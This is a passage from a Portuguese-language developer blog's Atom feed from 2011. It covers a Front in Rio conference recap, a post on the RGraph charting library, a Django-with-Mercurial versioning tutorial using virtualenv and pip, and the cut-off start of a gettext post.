acabaram, não pude deixar de acompanhar meus colegas &lt;a href="http://twitter.com/#!/romulojales" title="Acompanhe o bom humor do Rômulo Jales"&gt;&lt;em&gt;@romulojales&lt;/em&gt;&lt;/a&gt;,
&lt;a href="http://twitter.com/#!/kenjiyamamoto" title="Novidades tecnológicas são com ele!"&gt;&lt;em&gt;@kenjiyamamoto&lt;/em&gt;&lt;/a&gt; e &lt;a href="http://twitter.com/#!/davidsonFellipe" title="Davidson fala muito sobre front-end em seu Twitter"&gt;&lt;em&gt;@davidsonFellipe&lt;/em&gt;&lt;/a&gt; na edição do &lt;a href="http://www.frontinrio.com.br/" title="Página oficial do evento"&gt;&lt;em&gt;Front in Rio 2011&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;É o primeiro evento que participo como funcionário da &lt;a href="http://globo.com/" title="Absolutamente tudo sobre notícias, entretenimento e esportes"&gt;&lt;em&gt;Globo.com&lt;/em&gt;&lt;/a&gt;, e
devo confessar que é também o primeiro evento fora do ambiente
acadêmico. Não, não palestrei… esse papel foi muito bem desempenhado
pelas grandes pessoas que estiveram “em cima dos palcos”.&lt;/p&gt;
&lt;h2&gt;@font-face&lt;/h2&gt;
&lt;p&gt;&lt;img class="align-left" src="/images/blog/maujor-frontinrio-2011.jpg" width="300" height="205" title="Maujor no Front in Rio 2011" alt="Maujor no Front in Rio 2011"&gt;
E para começar bem o dia, fui logo ver o mestre, o “dinossauro das CSS“, &lt;a href="http://twitter.com/#!/maujor/" title="Twitter do Maujor"&gt;&lt;em&gt;@maujor&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Em uma palestra descontraída, ele nos apresentou a propriedade
&lt;code&gt;@font-face&lt;/code&gt; da &lt;a href="https://klauslaube.com.br/tag/css3.html" title="Leia mais sobre CSS3"&gt;&lt;em&gt;CSS3&lt;/em&gt;&lt;/a&gt;. Agora podemos deixar os &lt;em&gt;designers&lt;/em&gt;
utilizarem as fontes que bem entenderem (calma, estou sendo exagerado),
pois com este recurso, poderemos “uppar” um arquivo de fonte para um
servidor remoto. O navegador fará &lt;em&gt;download&lt;/em&gt; deste arquivo,
interpretando assim os mais bizarros &lt;code&gt;font-family&lt;/code&gt; que o “pessoal do
photoshop” sempre quis utilizar:&lt;/p&gt;
&lt;p&gt;&lt;iframe src="https://slideshare.net/slideshow/embed_code/7916312" width="590" height="481" marginwidth="0" marginheight="0" scrolling="no"&gt;&lt;/iframe&gt;&lt;/p&gt;
&lt;h2&gt;Android UI Design Patterns &amp;amp; Melhores Práticas&lt;/h2&gt;
&lt;p&gt;Em seguida, &lt;em&gt;Oscar Marques&lt;/em&gt; esclareceu ao pessoal sobre as melhores
práticas do desenvolvimento &lt;em&gt;Android&lt;/em&gt; tratando-se de &lt;em&gt;front-end&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Embora a palestra tenha sido bem rápida, o &lt;em&gt;Oscar&lt;/em&gt; foi capaz de
transmitir alguns conceitos e cuidados em relação ao desenvolvimento
&lt;em&gt;Android&lt;/em&gt;. Foi interessante ver que o pessoal tem uma forte preocupação
com a usabilidade, principalmente levando em conta o fato que o
&lt;em&gt;Android&lt;/em&gt; está disseminado nos mais diversos tipos de dispositivos.&lt;/p&gt;
&lt;h2&gt;Desbravando o HTML5 Boilerplate&lt;/h2&gt;
&lt;p&gt;E a &lt;a href="https://klauslaube.com.br/tag/html5.html" title="Leia mais sobre HTML5"&gt;&lt;em&gt;HTML5&lt;/em&gt;&lt;/a&gt; esteve fortemente representada neste &lt;em&gt;Front in Rio&lt;/em&gt;.
&lt;a href="http://twitter.com/#!/zenorocha/" title="Twitter do Zeno"&gt;&lt;em&gt;@zenorocha&lt;/em&gt;&lt;/a&gt; me convenceu a deixar com que o pessoal do &lt;a href="http://html5boilerplate.com/" title="Visite o site oficial do projeto HTML5 Boilerplate"&gt;&lt;em&gt;HTML5
Boilerplate&lt;/em&gt;&lt;/a&gt; guiasse a estrutura dos meus próximos projetos com
&lt;em&gt;HTML5&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Em uma palestra com bastante momentos práticos, &lt;em&gt;Zeno&lt;/em&gt; nos explicou a
filosofia do projeto e seus artefatos. No final, nos presenteou com
alguns &lt;em&gt;links&lt;/em&gt;, entre eles o &lt;a href="https://github.com/mike360/django-html5-boilerplate" title="Visite e contribua com o projeto no GitHub"&gt;&lt;em&gt;django-html5-boilerplate&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;iframe src="https://slideshare.net/slideshow/embed_code/8346961" width="590" height="481" marginwidth="0" marginheight="0" scrolling="no"&gt;&lt;/iframe&gt;&lt;/p&gt;
&lt;h2&gt;Seletores&lt;/h2&gt;
&lt;p&gt;Depois do almoço, e de uma caminhada para conhecer um pouco mais o
bairro da &lt;em&gt;Urca&lt;/em&gt;, foi a vez de prestigiar o colega de trabalho
&lt;a href="http://twitter.com/#!/fabiomiranda" title="Twitter do Fábio Miranda"&gt;&lt;em&gt;@fabiomiranda&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;“Mago dos seletores”, como denominado por alguns colegas, o &lt;em&gt;Fábio&lt;/em&gt;
ajudou a construir a &lt;em&gt;engine&lt;/em&gt; de seletores da &lt;a href="http://www.mootools.net/" title="Página oficial da framework Mootools"&gt;&lt;em&gt;Mootools&lt;/em&gt;&lt;/a&gt;. Além de
nos apresentar a &lt;a href="http://sizzlejs.com/" title="Conheça a engine selector utilizada pela jQuery"&gt;&lt;em&gt;Sizzle&lt;/em&gt;&lt;/a&gt; (utilizada pela &lt;a href="http://www.jquery.com/" title="Página oficial da framework jQuery"&gt;&lt;em&gt;jQuery&lt;/em&gt;&lt;/a&gt;) e a
&lt;a href="http://www.xpertdeveloper.com/2010/10/introduction-to-slick-a-standalone-element-selector-engine/" title="Introduction to Slick – A Standalone Element Selector Engine"&gt;&lt;em&gt;Slick&lt;/em&gt;&lt;/a&gt; (utilizada pela &lt;em&gt;Mootools&lt;/em&gt;), propos a análise de alguns
seletores e nos fez pensar sobre performance.&lt;/p&gt;
&lt;p&gt;A palestra, embora recheada de piadas internas, foi extremamente útil:&lt;/p&gt;
&lt;p&gt;&lt;iframe src="https://slideshare.net/slideshow/embed_code/8348815" width="590" height="481" marginwidth="0" marginheight="0" scrolling="no"&gt;&lt;/iframe&gt;&lt;/p&gt;
&lt;h2&gt;Animações e Jogos além do canvas&lt;/h2&gt;
&lt;p&gt;E mais uma vez a dupla &lt;em&gt;HTML5&lt;/em&gt; e &lt;em&gt;CSS3&lt;/em&gt; teve vez com a palestra do
&lt;a href="http://twitter.com/#!/andrewsmedina" title="Twitter do Andrews Medina"&gt;&lt;em&gt;@andrewsmedina&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Andrews&lt;/em&gt; apresentou alguns argumentos para deixarmos de pensar somente
em &lt;em&gt;canvas&lt;/em&gt; quando o assunto é desenvolvimento de jogos para a
&lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;Web&lt;/em&gt;&lt;/a&gt;, e considerarmos o uso de “elementos comuns” (como &lt;code&gt;div&lt;/code&gt;) e
das propriedades de animação e transformação da &lt;em&gt;CSS3&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Ele desenvolveu um &lt;em&gt;pacman&lt;/em&gt; simples, que ilustrou muito bem o objetivo
da palestra. O projeto, inclusive, está no &lt;a href="https://github.com/andrewsmedina/pacman" title="Projeto do web-game Pacman de Andrews Medina"&gt;&lt;em&gt;GitHub&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;iframe src="https://slideshare.net/slideshow/embed_code/8355676" width="590" height="481" marginwidth="0" marginheight="0" scrolling="no"&gt;&lt;/iframe&gt;&lt;/p&gt;
&lt;h2&gt;Canvas vs. SVG&lt;/h2&gt;
&lt;p&gt;Para finalizar o dia, o amigo &lt;a href="http://twitter.com/#!/davidsonFellipe" title="Davidson fala muito sobre front-end em seu Twitter"&gt;&lt;em&gt;@davidsonFellipe&lt;/em&gt;&lt;/a&gt; fez um comparativo
entre &lt;em&gt;canvas&lt;/em&gt; e &lt;em&gt;svg&lt;/em&gt;, dando dicas de uso de ambos (em seus respectivos
cenários). Para aqueles que ainda têm dúvidas sobre onde usar cada um,
foi uma palestra extremamente esclarecedora.&lt;/p&gt;
&lt;p&gt;A sua palestra lembrou-me muito um &lt;a href="http://www.profissionaisti.com.br/2009/01/svg-x-canvas-entenda-as-diferencas/" title="SVG x Canvas: Entenda as diferenças"&gt;&lt;em&gt;post&lt;/em&gt; que fiz ao &lt;em&gt;Profissionais TI&lt;/em&gt;
sobre o assunto&lt;/a&gt;. No final das contas, concordei 100% com tudo o que
foi proposto pelo palestrante.&lt;/p&gt;
&lt;p&gt;&lt;iframe src="https://slideshare.net/slideshow/embed_code/8354309" width="590" height="481" marginwidth="0" marginheight="0" scrolling="no"&gt;&lt;/iframe&gt;&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Voltei para casa, com aquele sentimento de um grande dia. Posso resumir
assim esta edição do &lt;em&gt;Front in Rio 2011&lt;/em&gt; (e olha que tinham &lt;a href="http://www.frontinrio.com.br/" title="Confira a grade completa do Front in Rio 2011"&gt;mais
palestras para assistir!&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;Agora é esperar até o ano que vem, e quem sabe, deixar de ser somente um
“consumidor”.&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="eventos"></category><category term="android"></category><category term="canvas"></category><category term="css3"></category><category term="frontinrio"></category><category term="html5"></category><category term="svg"></category></entry><entry><title>Gráficos estatísticos em Canvas com RGraph</title><link href="https://klauslaube.com.br/2011/06/12/graficos-estatisticos-em-canvas-rgraph.html" rel="alternate"></link><published>2011-06-12T21:38:00-03:00</published><updated>2011-06-12T21:38:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2011-06-12:/2011/06/12/graficos-estatisticos-em-canvas-rgraph.html</id><summary type="html">&lt;p&gt;O &lt;a href="http://www.rgraph.net/" title="RGraph: HTML5 canvas graph library based on the HTML5 canvas tag"&gt;&lt;em&gt;RGraph&lt;/em&gt;&lt;/a&gt; é uma fantástica &lt;em&gt;lib&lt;/em&gt; &lt;a href="https://klauslaube.com.br/tag/javascript.html" title="Leia mais sobre Javascript"&gt;&lt;em&gt;Javascript&lt;/em&gt;&lt;/a&gt;, que gera
gráficos estatísticos em &lt;a href="https://klauslaube.com.br/tag/html5.html" title="Leia mais sobre HTML5"&gt;&lt;em&gt;Canvas&lt;/em&gt;&lt;/a&gt; de uma forma extremamente simples
e direta. Sinceramente, foi uma das &lt;em&gt;libs&lt;/em&gt; mais eficazes que já usei
para criar representações visuais de relatórios.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Por criar gráficos em &lt;em&gt;Canvas&lt;/em&gt;, podemos interagir com os elementos
através do &lt;em&gt;Javascript&lt;/em&gt;. Isso …&lt;/p&gt;</summary><content type="html">&lt;p&gt;O &lt;a href="http://www.rgraph.net/" title="RGraph: HTML5 canvas graph library based on the HTML5 canvas tag"&gt;&lt;em&gt;RGraph&lt;/em&gt;&lt;/a&gt; é uma fantástica &lt;em&gt;lib&lt;/em&gt; &lt;a href="https://klauslaube.com.br/tag/javascript.html" title="Leia mais sobre Javascript"&gt;&lt;em&gt;Javascript&lt;/em&gt;&lt;/a&gt;, que gera
gráficos estatísticos em &lt;a href="https://klauslaube.com.br/tag/html5.html" title="Leia mais sobre HTML5"&gt;&lt;em&gt;Canvas&lt;/em&gt;&lt;/a&gt; de uma forma extremamente simples
e direta. Sinceramente, foi uma das &lt;em&gt;libs&lt;/em&gt; mais eficazes que já usei
para criar representações visuais de relatórios.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Por criar gráficos em &lt;em&gt;Canvas&lt;/em&gt;, podemos interagir com os elementos
através do &lt;em&gt;Javascript&lt;/em&gt;. Isso permite que nossos sistemas fiquem muito
mais dinâmicos (e ainda por cima, garante que nossos clientes vejam
representações visuais dos números da sua empresa em seu &lt;em&gt;iPad&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;Contamos com os seguintes tipos de gráficos:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Barra (&lt;a href="http://www.rgraph.net/examples/hbar.html" title="Veja exemplo de gráfico de barra horizontal"&gt;horizontal&lt;/a&gt; e &lt;a href="http://www.rgraph.net/examples/bar.html" title="Veja exemplo de gráfico de barra vertical"&gt;vertical&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;Barra de progresso (&lt;a href="http://www.rgraph.net/examples/hprogress.html" title="Veja exemplo de barra de progresso horizontal"&gt;horizontal&lt;/a&gt; e &lt;a href="http://www.rgraph.net/examples/vprogress.html" title="Veja exemplo de barra de progresso vertical"&gt;vertical&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.rgraph.net/examples/bipolar.html" title="Veja exemplo de gráfico bipolar"&gt;Bi-polar&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.rgraph.net/examples/donut.html" title="Veja exemplo de gráfico de donut"&gt;&lt;em&gt;Donut&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.rgraph.net/examples/funnel.html" title="Veja exemplo de gráfico de funil"&gt;Funil&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.rgraph.net/examples/line.html" title="Veja exemplo de gráfico de linha"&gt;Linha&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.rgraph.net/examples/odo.html" title="Veja exemplo de gráfico de odômetro"&gt;Odômetro&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.rgraph.net/examples/pie.html" title="Veja exemplo de gráfico em pizza"&gt;&lt;em&gt;Pizza&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.rgraph.net/examples/tradar.html" title="Veja exemplo de gráfico em forma de radar"&gt;Radar&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.rgraph.net/examples/rose.html" title="Veja exemplo de gráfico de rosa"&gt;Rosa&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.rgraph.net/examples/thermometer.html" title="Veja exemplo de gráfico em forma de termometro"&gt;Termometro&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Entre outros…&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;RGraph&lt;/em&gt; é gratuito para uso não comercial. Se você está disposto a
utilizá-lo em uma aplicação comercial, eu recomendo a sua compra.
Utilizamos na &lt;a href="http://www.setinet.com.br/" title="Seti - Internet Controlada"&gt;&lt;em&gt;Seti&lt;/em&gt;&lt;/a&gt; com muito sucesso esta poderosa ferramenta.&lt;/p&gt;
&lt;p&gt;E você? Conhece alguma outra &lt;em&gt;lib&lt;/em&gt; para criar dados estatísticos?
Conte-nos através dos comentários abaixo.&lt;/p&gt;
&lt;p&gt;Até a próxima…&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="html5"></category><category term="rgraph"></category><category term="padroes-web"></category></entry><entry><title>Como versionar projetos Django com o Mercurial - Parte 3</title><link href="https://klauslaube.com.br/2011/06/04/como-versionar-projetos-django-mercurial-parte-3.html" rel="alternate"></link><published>2011-06-04T12:27:00-03:00</published><updated>2011-06-04T12:27:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2011-06-04:/2011/06/04/como-versionar-projetos-django-mercurial-parte-3.html</id><summary type="html">&lt;p&gt;Dando continuidade a micro-série &lt;em&gt;Como versionar projetos _Django&lt;/em&gt; com o
&lt;em&gt;Mercurial&lt;/em&gt; (confira a &lt;a href="https://klauslaube.com.br/2011/05/10/como-versionar-projetos-django-mercurial-parte.html"&gt;parte 1&lt;/a&gt; e a &lt;a href="https://klauslaube.com.br/2011/05/22/como-versionar-projetos-django-mercurial-parte-2.html" title="Como versionar projetos Django com o Mercurial - Parte 2"&gt;parte 2&lt;/a&gt;), vamos finalizar com
um exemplo prático de um projeto &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; usando o &lt;a href="https://klauslaube.com.br/tag/mercurial.html" title="Leia mais sobre Mercurial"&gt;&lt;em&gt;Mercurial&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;Começando…&lt;/h2&gt;
&lt;p&gt;Vamos reutilizar a estrutura dos &lt;em&gt;posts&lt;/em&gt; anteriores. Para isso, inicie
um projeto com o &lt;a href="https://klauslaube.com.br/tag/virtualenv.html" title="Leia mais sobre virtualenv"&gt;&lt;em&gt;virtualenv&lt;/em&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nb"&gt;cd&lt;/span&gt; ~/Projetos …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;Dando continuidade a micro-série &lt;em&gt;Como versionar projetos _Django&lt;/em&gt; com o
&lt;em&gt;Mercurial&lt;/em&gt; (confira a &lt;a href="https://klauslaube.com.br/2011/05/10/como-versionar-projetos-django-mercurial-parte.html"&gt;parte 1&lt;/a&gt; e a &lt;a href="https://klauslaube.com.br/2011/05/22/como-versionar-projetos-django-mercurial-parte-2.html" title="Como versionar projetos Django com o Mercurial - Parte 2"&gt;parte 2&lt;/a&gt;), vamos finalizar com
um exemplo prático de um projeto &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; usando o &lt;a href="https://klauslaube.com.br/tag/mercurial.html" title="Leia mais sobre Mercurial"&gt;&lt;em&gt;Mercurial&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;Começando…&lt;/h2&gt;
&lt;p&gt;Vamos reutilizar a estrutura dos &lt;em&gt;posts&lt;/em&gt; anteriores. Para isso, inicie
um projeto com o &lt;a href="https://klauslaube.com.br/tag/virtualenv.html" title="Leia mais sobre virtualenv"&gt;&lt;em&gt;virtualenv&lt;/em&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nb"&gt;cd&lt;/span&gt; ~/Projetos/
$ virtualenv DjangoComHG --no-site-packages
$ &lt;span class="nb"&gt;cd&lt;/span&gt; DjangoComHG/
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos aproveitar os procedimentos descritos na &lt;a href="https://klauslaube.com.br/2011/05/22/como-versionar-projetos-django-mercurial-parte-2.html" title="Aprenda a como criar um repositório Mercurial no Bitbucket"&gt;parte 2&lt;/a&gt; deste
&lt;em&gt;post&lt;/em&gt;. Caso você ainda não tenha criado um repositório no
&lt;a href="http://www.bitbucket.org/" title="Versione e compartilhe código com o Mercurial"&gt;&lt;em&gt;Bitbucket&lt;/em&gt;&lt;/a&gt;, essa é uma boa oportunidade.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ hg clone &amp;lt;caminho&amp;gt; django_com_hg
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Não esqueça de mudar o &lt;strong&gt;caminho&lt;/strong&gt; para o &lt;strong&gt;endereço do seu
repositório&lt;/strong&gt;.&lt;/p&gt;
&lt;h2&gt;Instalando o Django&lt;/h2&gt;
&lt;p&gt;Com o &lt;em&gt;virtualenv&lt;/em&gt; ativado, vamos instalar o &lt;em&gt;Django&lt;/em&gt; apenas para o
nosso ambiente &lt;em&gt;virtual&lt;/em&gt; através do &lt;em&gt;pip&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nb"&gt;source&lt;/span&gt; bin/activate
$ pip install django
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Só para ter certeza que ele instalou o &lt;em&gt;Django&lt;/em&gt; dentro do nosso ambiente
virtual, vamos abrir o terminal do &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; e digitar as seguintes
instruções:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;django&lt;/span&gt;
&lt;span class="n"&gt;django&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__path__&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Você deverá obter como resposta uma &lt;em&gt;string&lt;/em&gt; semelhante a esta:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;$HOME&lt;/span&gt;/Projetos/DjangoComHG/lib/python2.6/site-packages/django/
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Iniciando um projeto&lt;/h2&gt;
&lt;p&gt;Vamos fazer uma pequena brincadeira de troca de nomes de pastas, para
que possamos criar o nosso projeto &lt;em&gt;Django&lt;/em&gt; com o mesmo nome do
repositório &lt;em&gt;Mercurial&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ mv post_django_com_hg post_django_com_hg.bk
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Agora mandamos o &lt;code&gt;django-admin.py&lt;/code&gt; iniciar o projeto:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ django-admin.py startproject post_django_com_hg
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Movemos os arquivos do nosso repositório para dentro de
&lt;code&gt;post_django_com_hg&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ mv post_django_com_hg.bk/* post_django_com_hg/
$ mv post_django_com_hg.bk/.hg post_django_com_hg/
$ mv post_django_com_hg.bk/.hgignore post_django_com_hg/
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Entre no diretório &lt;code&gt;post_django_com_hg&lt;/code&gt; e dê um &lt;code&gt;hg status&lt;/code&gt;. Os
arquivos base do &lt;em&gt;Django&lt;/em&gt; não estão no projeto. Vamos adicioná-los,
comitá-los e dar um &lt;code&gt;push&lt;/code&gt; deles para o repositório &lt;em&gt;Mercurial&lt;/em&gt; no
&lt;em&gt;Bitbucket&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ hg add .
$ hg commit -m &lt;span class="s2"&gt;&amp;quot;Projeto Django iniciado&amp;quot;&lt;/span&gt;
$ hg push
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Nos &lt;em&gt;changesets&lt;/em&gt; do repositório, veremos a contribuição enviada:&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/changesets-no-bitbucket.png" width="568" height="167" title="Changeset no BitBucket" alt="Changeset no BitBucket"&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Pronto!&lt;/strong&gt; Basicamente, para termos o &lt;em&gt;Mercurial&lt;/em&gt; versionando um
projeto &lt;em&gt;Django&lt;/em&gt;, são estes os procedimentos… mas eu sei como deixar a
coisa ainda mais interessante&lt;/p&gt;
&lt;h2&gt;Hora de congelar!&lt;/h2&gt;
&lt;p&gt;Digamos que você tenha um colaborador envolvido com o projeto. Quer
dizer que ele vai ter que criar um &lt;em&gt;virtualenv&lt;/em&gt;, clonar o repositório e
instalar as dependências do projeto? A resposta é “sim” – Mas podemos
facilitar esta última parte através do &lt;em&gt;pip&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pip freeze

&lt;span class="nv"&gt;Django&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.3
&lt;span class="nv"&gt;wsgiref&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.1.2
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O comando &lt;code&gt;pip freeze&lt;/code&gt; vai coletar os pacotes &lt;em&gt;Python&lt;/em&gt; instalados
(nesse nosso caso, dentro do nosso ambiente virtual através do
&lt;em&gt;virtualenv&lt;/em&gt;) e exibir para a gente em formato de lista. Com isso,
podemos criar um arquivo que armazene as dependências do nosso projeto:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pip freeze &amp;gt; requirements.txt
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos desativar o ambiente atual, criar um novo e instalar as
dependências listadas nesta arquivo &lt;code&gt;requirements.txt&lt;/code&gt; neste novo
ambiente:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ deactivate
$ &lt;span class="nb"&gt;cd&lt;/span&gt; ~/Projetos/
$ virtualenv DjangoComHG-2 --no-site-packages
$ &lt;span class="nb"&gt;source&lt;/span&gt; DjangoComHG-2/bin/activate
$ pip install -r DjangoComHG/post_django_com_hg/requirements.txt
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Veja a mágica acontecendo… o &lt;em&gt;pip&lt;/em&gt; instalará todas as dependências
contidas em &lt;code&gt;requirements.txt&lt;/code&gt; em nosso novo ambiente virtual.&lt;/p&gt;
&lt;p&gt;Podemos resumir os comandos acima em:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pip install -E DjangoComHG-2 -r DjangoComHG/post_django_com_hg/requirements.txt
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A instrução acima deverá ser escrita em um linha só.&lt;/p&gt;
&lt;h2&gt;Versionando dependências do projeto&lt;/h2&gt;
&lt;p&gt;Logo o &lt;code&gt;requirements.txt&lt;/code&gt; sendo um arquivo de texto, pode ser
facilmente versionado pelo &lt;em&gt;Mercurial&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nb"&gt;cd&lt;/span&gt; ~/Projetos/DjangoComHG/post_django_com_hg
$ hg add requirements.txt
$ hg commit -m &lt;span class="s2"&gt;&amp;quot;Adicionado arquivo de dependências do pip&amp;quot;&lt;/span&gt;
$ hg push
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finalmente, temos um projeto &lt;em&gt;Django&lt;/em&gt; versionado com &lt;em&gt;Mercurial&lt;/em&gt;,
disponível no &lt;em&gt;Bitbucket&lt;/em&gt;, e com dependências facilmente gerenciáveis
através do &lt;em&gt;pip&lt;/em&gt; em conjunto com o &lt;em&gt;virtualenv&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;E você… utiliza controle de versão com o &lt;em&gt;Django&lt;/em&gt; de uma outra forma?
Conte-nos através dos comentários abaixo.&lt;/p&gt;
&lt;p&gt;Até a próxima…&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="ambiente-de-desenvolvimento"></category><category term="python"></category><category term="django"></category><category term="virtualenv"></category><category term="mercurial"></category><category term="pip"></category></entry><entry><title>Quando usar gettext e gettext_lazy?</title><link href="https://klauslaube.com.br/2011/06/01/quando-usar-gettext-gettext_lazy.html" rel="alternate"></link><published>2011-06-01T09:41:00-03:00</published><updated>2011-06-01T09:41:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2011-06-01:/2011/06/01/quando-usar-gettext-gettext_lazy.html</id><summary type="html">&lt;p&gt;Para vocês que desenvolvem em &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; e &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; preocupando-se
com internacionalização, já devem ter feito a seguinte pergunta: Quando
usar &lt;code&gt;gettext&lt;/code&gt; e &lt;code&gt;gettext_lazy&lt;/code&gt;?&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Acredito que antes de responder esta pergunta, temos que responder outra
questão pertinente: Devo utilizar &lt;code&gt;gettext&lt;/code&gt; ou &lt;code&gt;ugettext&lt;/code&gt;?&lt;/p&gt;
&lt;h2&gt;gettext vs ugettext&lt;/h2&gt;
&lt;p&gt;Essas duas funções seguem o mesmo …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Para vocês que desenvolvem em &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; e &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; preocupando-se
